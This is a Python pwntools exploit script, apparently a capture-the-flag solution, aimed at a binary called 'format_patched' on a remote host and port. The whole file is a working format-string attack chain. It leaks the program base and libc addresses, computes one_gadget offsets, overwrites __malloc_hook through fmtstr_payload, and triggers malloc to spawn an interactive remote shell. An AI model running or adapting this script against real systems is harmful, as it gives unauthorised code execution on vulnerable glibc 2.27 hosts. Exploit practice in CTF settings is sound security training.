#!/usr/bin/python3
from pwn import *

context.binary = exe = ELF('./format_patched',checksec=False)
libc = ELF('./libc6_2.27-0ubuntu2_amd64.so')
#p = process()
p = remote('94.237.59.180',30416)
#gdb.attach(p,gdbscript='''
#           brva 0x00000000000011F1
#           ''')
p.sendline(b'%41$p|')
exe.address = int(p.recvuntil(b'|')[:-1],16) - 0x12b3

log.info(f"exe: {hex(exe.address)}")

payload  = b'%7$s'
payload = payload.ljust(8,b'\x00')
payload += p64(exe.got.printf)
p.sendline(payload)

p.recvline()
leak = u64(p.recv(6).ljust(8,b'\x00'))
print("leak: ",hex(leak))
libc.address = leak - libc.sym.printf
print("libc address: ",hex(libc.address))

og = [libc.address+x for x in [0x4f2be,0x4f2c5,0x4f322,0x10a38c]]
print(f"OG {[hex(x) for x in og]} ")
print("this is malloc_hook: ",hex(libc.sym.__malloc_hook))
wrties = {libc.sym.__malloc_hook : og[2]}
fmt = fmtstr_payload(6,wrties)
input()
p.sendline(fmt)
p.sendline(b'%900000c')


p.interactive()
